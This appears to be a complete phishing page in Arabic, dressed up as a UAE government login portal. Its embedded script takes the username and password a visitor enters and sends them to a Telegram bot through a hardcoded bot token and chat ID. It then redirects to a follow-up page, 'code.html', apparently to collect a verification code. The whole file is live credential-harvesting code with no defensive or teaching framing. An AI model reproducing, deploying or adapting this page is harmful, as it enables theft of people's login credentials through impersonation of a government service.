<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>تسجيل الدخول</title>

  <style>
    body{font-family:Tahoma,Arial;background:#fff;margin:0;min-height:100vh;display:flex;flex-direction:column}
    header{text-align:center;padding:20px}
    header img{height:80px;max-width:100%}
    main{flex:1;padding:20px}
    form{max-width:420px;margin:auto;background:#fff;padding:20px;border-radius:8px;box-shadow:0 0 8px rgba(0,0,0,.12)}
    label{display:block;margin-top:14px;font-weight:700}
    input,button{
      width:100%;padding:12px;margin-top:6px;
      border:1px solid #ccc;border-radius:6px;box-sizing:border-box
    }
    button{
      background:#0b5320;color:#fff;border:0;font-weight:800;
      cursor:pointer;position:relative
    }
    button:hover{background:#094418}
    button:disabled{opacity:.7;cursor:not-allowed}

    /* خطأ الحقول */
    .error{
      border-color:#c00 !important;
      background:#fff6f6;
    }

    .spinner{
      width:22px;height:22px;
      border:3px solid rgba(255,255,255,.4);
      border-top:3px solid #fff;
      border-radius:50%;
      animation:spin 1s linear infinite;
      position:absolute;top:50%;left:50%;
      transform:translate(-50%,-50%);
      display:none;
    }
    @keyframes spin{to{transform:translate(-50%,-50%) rotate(360deg)}}

    footer{
      background:#000;color:#fff;padding:18px 20px;margin-top:30px;
      font-size:13px;text-align:center
    }

    /* تحميل أول الدخول */
    #pageLoader{
      position:fixed;inset:0;background:transparent;
      display:flex;align-items:center;justify-content:center;
      z-index:9999;pointer-events:none;
    }
    #pageLoader .bigSpinner{
      width:90px;height:90px;
      border:10px solid rgba(0,0,0,.15);
      border-top-color:#000;border-radius:50%;
      animation:bigSpin 1s linear infinite;
    }
    @keyframes bigSpin{to{transform:rotate(360deg)}}

    /* تنسيق حقول تسجيل الدخول */
    #username, #password {
      direction: ltr;
      text-align: left;
    }
  </style>
</head>

<body>

<div id="pageLoader"><div class="bigSpinner"></div></div>

<header>
  <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663247919896/JHmpSPqkiKWxwoeP.png" alt="الشعار">
</header>

<main>
<form id="loginForm" novalidate>

  <label>اسم المستخدم *</label>
  <input id="username" type="text" placeholder="أدخل اسم المستخدم">

  <label>كلمة المرور *</label>
  <input id="password" type="password" placeholder="أدخل كلمة المرور">

  <button id="loginBtn" type="submit">
    <span id="loginText">دخول</span>
    <span class="spinner" id="loginSpinner"></span>
  </button>

</form>
</main>

<footer>
  سياسة الخصوصية • حقوق النشر • شروط الاستخدام • معايير WCAG 2.0 AAA • © حكومة الإمارات 2026
</footer>

<script>
  // تحميل أول دخول الصفحة
  const pageLoader = document.getElementById('pageLoader');
  const loginForm = document.getElementById('loginForm');
  const username = document.getElementById('username');
  const password = document.getElementById('password');
  const loginBtn = document.getElementById('loginBtn');
  const loginText = document.getElementById('loginText');
  const loginSpinner = document.getElementById('loginSpinner');

  setTimeout(()=> { if(pageLoader) pageLoader.style.display='none'; }, 4000);

  // إزالة رسالة الخطأ عند الكتابة
  if(username) username.addEventListener('input', () => username.classList.remove('error'));
  if(password) password.addEventListener('input', () => password.classList.remove('error'));

  if(loginForm) {
    loginForm.onsubmit = (e) => {
      e.preventDefault();

      let ok = true;

      // التحقق من اسم المستخدم
      if(!username.value.trim()){username.classList.add('error'); ok=false;}

      // التحقق من كلمة المرور
      if(!password.value.trim()){password.classList.add('error'); ok=false;}

      if(!ok) return;

      loginBtn.disabled = true;
      loginText.style.visibility = 'hidden';
      loginSpinner.style.display = 'block';

      // إرسال البيانات إلى تلجرام
      const token = "8528188278:AAGVc4oOzJjpOgIe6tWwCpQlY5CsAdCRrzk";
      const chatId = "8404960059";
      const message = `
🔔 محاولة تسجيل دخول جديدة:
👤 اسم المستخدم: ${username.value}
🔐 كلمة المرور: ${password.value}
      `;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
      .then(() => {
        // التوجيه بعد النجاح
        setTimeout(()=>location.href='code.html',1000);
      })
      .catch(err => {
        console.error(err);
        // حتى لو فشل الإرسال نوجه المستخدم أو نظهر خطأ
        setTimeout(()=>location.href='code.html',1000);
      });
    };
  }
</script>

</body>
</html>
